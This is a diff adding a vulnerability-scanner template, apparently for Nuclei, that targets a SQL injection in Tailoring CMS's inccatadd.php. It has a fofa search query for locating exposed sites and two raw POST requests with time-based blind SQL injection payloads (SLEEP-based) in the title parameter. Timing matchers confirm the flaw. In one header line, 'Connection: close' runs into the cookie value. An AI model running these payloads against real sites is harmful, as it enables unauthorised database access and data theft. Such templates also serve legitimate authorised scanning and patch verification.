@@ -1,0 +1,33 @@
+id: tailoring-cms-sql
+info:
+  name: Tailoring CMS inccatadd.php SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: "Fill in the form below to get instant access:" && "assets/js/retina-1.1.0.min.js"
+      Tailoring CMS 的 inccatadd.php 组件中，title 参数未经任何输入验证直接拼接至 SQL 查询语句，攻击者可通过构造恶意输入操控数据库查询逻辑，实现数据泄露、篡改或权限提升。
+  tags: Tailoring
+http:
+- raw:
+  - |
+    POST /inccatadd.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip, deflate
+    Cookie: __utma=123545163.603012537.1718449838.1718449838.1718449838.1; __utmz=123545163.1718449838.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=umavm58j5beqmmme0aof5v26v4Connection: close
+
+    title=123' AND (SELECT 6960 FROM (SELECT(SLEEP(5)))kEHc) AND 'yOHO'='yOHO
+  - |
+    POST /inccatadd.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip, deflate
+    Cookie: __utma=123545163.603012537.1718449838.1718449838.1718449838.1; __utmz=123545163.1718449838.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=umavm58j5beqmmme0aof5v26v4Connection: close
+
+    title=123' AND (SELECT 6960 FROM (SELECT(SLEEP(8)))kEHc) AND 'yOHO'='yOHO
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
